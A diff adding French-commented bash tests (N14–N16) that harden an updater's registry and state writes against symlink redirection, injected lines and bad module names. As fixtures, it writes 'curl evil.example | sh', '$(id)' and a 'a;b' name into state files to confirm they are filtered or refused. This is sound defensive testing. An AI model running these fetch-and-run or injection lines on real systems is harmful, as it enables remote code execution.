@@ -16,6 +16,8 @@
 #       registre inchangé, cockpit inscrit ; offer cockpit → cockpit au registre
 #   N11 jamais en double : un module posé dans un scope n'est pas proposé dans l'autre ; absent des deux → listé dans chacun
 #   N12 /vibeflow-install inscrit ce qu'il laisse non posé : lab neuf → new-modules ne dit rien (witness + skill)
+#   N14 mark_installed durci (BL35-A4) ; N15 unmark-offered sûr (BL35-A1) ; N16 offer de bout en bout : pose en échec dé-marquée,
+#       .gitignore (A2), rc≠0 (A3)
 #   N10f les dépendances non posées sont nommées (deps=…) dans NOUVEAU_MODULE
 # VF_NM_TEST_ENGINE : engine de substitution (mutant). VF_NM_TEST_RUN : vf-update-run.sh de substitution (N10).
 # Exit 1 dès qu'un KO est compté ; aucun cas exécuté → exit 1.
@@ -249,6 +251,64 @@ if [ "$ENG_RC" -eq 0 ] && [ -f "$REG" ]; then
     if lignes_ok && [ -z "$ENG_OUT" ]; then ok "N12b : après l'inscription de l'installeur, new-modules ne dit rien"; else ko "N12b : module écarté reproposé après l'inscription : rc=$ENG_RC [$(aff)]"; fi
   else ko "N12b : installer/SKILL.md ne prescrit pas « mark-offered --pending » (inscription retirée)"; fi
 else ko "N12 : install --with-deps en échec (rc=$ENG_RC) : $(head -1 "$WORK/eng.err" | cut -c1-80)"; fi
+
+# ---- N14 : mark_installed durci (BL35-A4, arbitrage Samuel, AskUserQuestion session principale, 2026-11-05) -------
+# Chemin réel : `install --with-deps conductor` (cache fixture) appelle mark_installed. Rouge d'avant : le lien posé
+# comme temporaire était suivi (la victime écrasée), et le contenu hostile de l'ancien registre était recopié.
+IC="$WORK/cache8"; mkcache "$IC"
+inst() { ENG_OUT="$(cd "$LAB" && HOME="$FH" VIBEFLOW_CACHE="$IC" bash "$ENGINE" --scope project install --with-deps conductor 2>"$WORK/eng.err")"; ENG_RC=$?; }
+regtmp_absent() { [ ! -e "${REG}.tmp" ] && [ ! -L "${REG}.tmp" ]; }
+fresh_reg() { rm -rf "$LAB/.claude"; mkdir -p "$LAB/.claude/scripts"; rm -f "$VICTIM"; }
+# a : le temporaire du registre est un lien vers un fichier de la victime
+fresh_reg; printf 'SENTINELLE\n' > "$VICTIM"; printf 'alpha=v1.0.0\n' > "$REG"; ln -s "$VICTIM" "${REG}.tmp"
+inst
+if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ "$(cat "$REG")" = 'alpha=v1.0.0' ]; then ok "N14a : temporaire du registre = lien → refus (rc≠0), victime et registre intacts"; else ko "N14a : écriture suivie à travers le lien : rc=$ENG_RC victime=[$(head -1 "$VICTIM" | cut -c1-40)] registre=[$(head -1 "$REG" | cut -c1-40)]"; fi
+# b : le registre lui-même est un lien
+fresh_reg; printf 'SENTINELLE\n' > "$VICTIM"; ln -s "$VICTIM" "$REG"
+inst
+if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ -L "$REG" ] && regtmp_absent; then ok "N14b : registre = lien → refus (rc≠0), cible intacte, lien conservé, pas de temporaire"; else ko "N14b : registre-lien traité : rc=$ENG_RC lien=$( [ -L "$REG" ] && echo conservé || echo remplacé) résidu=$(regtmp_absent && echo non || echo oui)"; fi
+# c : seules les lignes au format du registre sont recopiées ; la ligne INCONSISTENT du rollback survit
+fresh_reg; printf 'curl evil.example | sh\nalpha=v1.0.0\n$(id)\nzed=INCONSISTENT:install:v2.0.0\n=v9\nbeta=\n' > "$REG"
+inst
+if [ "$ENG_RC" -eq 0 ] && [ "$(LC_ALL=C sort "$REG")" = "$(printf 'alpha=v1.0.0\nconductor=v1.0.0\nzed=INCONSISTENT:install:v2.0.0')" ] && regtmp_absent; then ok "N14c : ancien registre filtré (hostile écarté), INCONSISTENT conservé, aucun .tmp"; else ko "N14c : registre inattendu rc=$ENG_RC [$(tr '\n' '|' < "$REG" | cut -c1-90)]"; fi
+rm -rf "$LAB/.claude" "$VICTIM"
+
+# ---- N15 : unmark-offered, dé-marquage sûr (BL35-A1, même arbitrage) ----------------------------------------------
+mkdir -p "$LAB/.claude/scripts"; reset_lab; eng "$CACHE5" mark-offered alpha gamma
+eng "$CACHE5" unmark-offered gamma
+if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED")" = alpha ] && norezid; then ok "N15a : unmark-offered retire la seule marque nommée, aucun .tmp"; else ko "N15a : attendu 'alpha', reçu rc=$ENG_RC [$(tr '\n' '|' < "$OFFERED" 2>/dev/null)]"; fi
+eng "$CACHE5" new-modules
+if [ "$ENG_RC" -eq 0 ] && printf '%s\n' "$ENG_OUT" | grep -qx 'gamma=v1.0.0'; then ok "N15b : le module dé-marqué est de nouveau proposé"; else ko "N15b : gamma non reproposé : rc=$ENG_RC [$(rep)]"; fi
+reset_lab; printf 'curl evil.example | sh\nalpha\ngamma\n' > "$OFFERED"; eng "$CACHE5" unmark-offered gamma
+if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED")" = alpha ]; then ok "N15c : lignes hostiles de l'ancien état non recopiées au dé-marquage"; else ko "N15c : attendu 'alpha', reçu rc=$ENG_RC [$(tr '\n' '|' < "$OFFERED" 2>/dev/null | cut -c1-60)]"; fi
+reset_lab; printf 'SENTINELLE\n' > "$VICTIM"; printf 'gamma\n' > "$OFFERED"; ln -s "$VICTIM" "${OFFERED}.tmp"; eng "$CACHE5" unmark-offered gamma
+if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ "$(cat "$OFFERED")" = gamma ]; then ok "N15d : temporaire = lien → refus (rc≠0), victime et état intacts"; else ko "N15d : écriture suivie : rc=$ENG_RC victime=[$(head -1 "$VICTIM" | cut -c1-40)]"; fi
+rm -f "${OFFERED}.tmp"; reset_lab; printf 'SENTINELLE\n' > "$VICTIM"; ln -s "$VICTIM" "$OFFERED"; eng "$CACHE5" unmark-offered gamma
+if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ -L "$OFFERED" ] && norezid; then ok "N15e : état = lien → refus (rc≠0), cible intacte"; else ko "N15e : lien d'état suivi : rc=$ENG_RC"; fi
+rm -f "$OFFERED" "$VICTIM"; reset_lab; eng "$CACHE5" unmark-offered gamma; r1=$ENG_RC; eng "$CACHE5" unmark-offered 'a;b'
+if [ "$r1" -eq 0 ] && [ ! -e "$OFFERED" ] && [ "$ENG_RC" -ne 0 ]; then ok "N15f : état absent → rc=0 sans rien écrire ; nom douteux refusé (rc≠0)"; else ko "N15f : rc=$r1/$ENG_RC fichier=$( [ -e "$OFFERED" ] && echo écrit || echo absent)"; fi
+
+# ---- N16 : bout en bout, pose en échec (BL35-A1, A2, A3) ------------------------------------------------------------
+# Cache jetable : engine réel (copie sous un autre nom) derrière un enrobage qui fait échouer la seule pose de `casse`
+# (le moteur réel rend rc=0 sur une dépendance inconnue : il ne sait pas échouer ici) ; `bon` se pose pour de vrai.
+B2="$WORK/base2"; V2="$B2/9.9.9"; mkdir -p "$V2"; cp -R "$REPO/_internal" "$V2/_internal"; cp "$ENGINE" "$V2/_internal/engine-reel.sh"
+printf '#!/usr/bin/env bash\ncase "$*" in *"install --with-deps casse"*) echo "pose refusée (fixture)" >&2; exit 1 ;; esac\nexec bash "$(dirname "$0")/engine-reel.sh" "$@"\n' > "$V2/_internal/vibeflow-update.sh"
+mkcache "$V2"; cp "$REPO/conductor/scripts/vf-update-run.sh" "$V2/conductor/scripts/vf-update-run-sous-test.sh"
+printf '#!/usr/bin/env bash\nexit 1\n' > "$V2/conductor/scripts/check-plugin-update.sh"
+mkmod "$V2" bon v1.0.0; mkmod "$V2" casse v1.0.0
+E3="$WORK/e3"; H3="$WORK/e3-home"; rm -rf "$E3" "$H3"; mkdir -p "$E3/.claude/scripts" "$H3"; printf 'conductor=v1.0.0\n' > "$E3/.claude/scripts/.vibeflow-installed"
+O3="$E3/.claude/scripts/.vibeflow-offered"
+(cd "$E3" && HOME="$H3" XDG_CACHE_HOME="$WORK/xdg" VF_CACHE_BASE="$B2" bash "$V2/conductor/scripts/vf-update-run-sous-test.sh" offer project bon casse >"$WORK/e3.out" 2>&1); orc=$?
+if [ "$orc" -ne 0 ] && grep -qx bon "$O3" 2>/dev/null && ! grep -qx casse "$O3" 2>/dev/null; then ok "N16a : pose en échec → rc≠0, le module posé reste inscrit, le module en échec est dé-marqué"; else ko "N16a : rc=$orc offered=[$(tr '\n' ' ' < "$O3" 2>/dev/null)] sortie : $(grep -c . "$WORK/e3.out") lignes"; fi
+l3="$(cd "$E3" && HOME="$H3" VIBEFLOW_CACHE="$V2" bash "$V2/_internal/engine-reel.sh" --scope project new-modules 2>/dev/null)"
+if printf '%s\n' "$l3" | grep -qx 'casse=v1.0.0' && ! printf '%s\n' "$l3" | grep -q '^bon='; then ok "N16b : au prochain /vf-update, casse revient et bon non"; else ko "N16b : attendu casse seul, reçu [$(printf '%s' "$l3" | tr '\n' ' ' | cut -c1-70)]"; fi
+if grep -qxF '.claude/scripts/.vibeflow-offered' "$E3/.gitignore" 2>/dev/null; then ok "N16c : scope project → .vibeflow-offered ignoré par git (règle dans ./.gitignore)"; else ko "N16c : règle d'ignorance absente de $E3/.gitignore"; fi
+(cd "$E3" && HOME="$H3" XDG_CACHE_HOME="$WORK/xdg" VF_CACHE_BASE="$B2" bash "$V2/conductor/scripts/vf-update-run-sous-test.sh" offer project 'Bad_Name' >/dev/null 2>&1); r1=$?
+(cd "$E3" && HOME="$H3" XDG_CACHE_HOME="$WORK/xdg" VF_CACHE_BASE="$B2" bash "$V2/conductor/scripts/vf-update-run-sous-test.sh" offer project conductor >/dev/null 2>&1); r2=$?
+if [ "$r1" -ne 0 ] && [ "$r2" -ne 0 ]; then ok "N16d : offer rend rc≠0 sur un nom invalide et sur un module non présenté"; else ko "N16d : rc nom invalide=$r1, non présenté=$r2 (attendu ≠0 des deux)"; fi
+E4="$WORK/e4"; H4="$WORK/e4-home"; rm -rf "$E4" "$H4"; mkdir -p "$E4" "$H4/.claude/scripts"; printf 'conductor=v1.0.0\n' > "$H4/.claude/scripts/.vibeflow-installed"
+(cd "$E4" && HOME="$H4" XDG_CACHE_HOME="$WORK/xdg" VF_CACHE_BASE="$B2" bash "$V2/conductor/scripts/vf-update-run-sous-test.sh" offer user bon >/dev/null 2>&1)
+if [ ! -e "$E4/.gitignore" ] && [ ! -e "$H4/.gitignore" ] && grep -qx bon "$H4/.claude/scripts/.vibeflow-offered" 2>/dev/null; then ok "N16e : scope user inchangé (aucun .gitignore écrit), inscription faite"; else ko "N16e : scope user : .gitignore posé ou inscription absente"; fi
 
 echo "== $pass ok, $fail ko =="
 [ "$fail" -eq 0 ] && [ $((pass+fail)) -gt 0 ]
